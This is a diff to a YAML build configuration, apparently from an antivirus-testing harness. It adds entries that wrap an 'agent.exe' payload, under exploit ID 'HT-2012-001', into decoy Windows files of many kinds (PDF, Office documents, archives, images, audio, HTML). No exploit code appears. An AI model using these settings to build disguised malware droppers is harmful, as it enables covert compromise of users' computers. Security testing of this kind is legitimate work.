@@ -86,17 +86,69 @@ build_parameters:
           melt: {appname: agent.exe, combo: txt, filename: example.txt, input: '000'}
           platform: exploit
           package: {}
+        exploit_pdf:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.pdf
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: pdf, filename: example.pdf, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_rtf:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.rtf
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: rtf, filename: example.rtf, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_doc:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.doc
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: doc, filename: example.doc, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_ppt:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.ppt
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: ppt, filename: example.ppt, input: '000'}
+          platform: exploit
+          package: {}
         exploit_docx:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile : AVAgent/assets/windows/meltexploit.docx
+          meltfile: AVAgent/assets/windows/meltexploit.docx
           generate:
             binary: {admin: false, demo: false}
-            exploit: HT-2013-002
+            exploit: HT-2012-001
             melt: {admin: false, demo: false, scout: true}
             platforms: [windows]
-          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          melt: {appname: agent.exe, combo: docx, filename: example.docx, input: '000'}
           platform: exploit
           package: {}
         exploit_ppsx:
@@ -106,23 +158,179 @@ build_parameters:
           meltfile: AVAgent/assets/windows/meltexploit.ppsx
           generate:
             binary: {admin: false, demo: false}
-            exploit: HT-2013-003
+            exploit: HT-2012-001
             melt: {admin: false, demo: false, scout: true}
             platforms: [windows]
-          melt: {appname: APPNAME, filename: example.ppsx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          melt: {appname: agent.exe, combo: ppsx, filename: example.ppsx, input: '000'}
           platform: exploit
           package: {}
-        exploit_web:
+        exploit_xls:
           platform_type: desktop
           deliver: {user: USERID}
           factory: {_id: '000'}
-          meltfile : AVAgent/assets/windows/meltexploit.docx
+          meltfile: AVAgent/assets/windows/meltexploit.xls
           generate:
             binary: {admin: false, demo: false}
-            exploit: HT-2013-002
+            exploit: HT-2012-001
             melt: {admin: false, demo: false, scout: true}
             platforms: [windows]
-          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
+          melt: {appname: agent.exe, combo: xls, filename: example.xls, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_rar:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.rar
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: rar, filename: example.rar, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_zip:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.zip
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: zip, filename: example.zip, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_exe:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltapp.exe
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: exe, filename: example.exe, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_avi:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.avi
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: avi, filename: example.avi, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_bmp:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.bmp
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: bmp, filename: example.bmp, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_eml:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.eml
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: eml, filename: example.eml, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_gif:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.gif
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: gif, filename: example.gif, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_html:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.html
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: html, filename: example.html, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_jpg:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.jpg
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: jpg, filename: example.jpg, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_mp3:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.mp3
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: mp3, filename: example.mp3, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_png:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.png
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: png, filename: example.png, input: '000'}
+          platform: exploit
+          package: {}
+        exploit_vsd:
+          platform_type: desktop
+          deliver: {user: USERID}
+          factory: {_id: '000'}
+          meltfile: AVAgent/assets/windows/meltexploit.vsd
+          generate:
+            binary: {admin: false, demo: false}
+            exploit: HT-2012-001
+            melt: {admin: false, demo: false, scout: true}
+            platforms: [windows]
+          melt: {appname: agent.exe, combo: vsd, filename: example.vsd, input: '000'}
           platform: exploit
           package: {}
         selfdel_exploit:
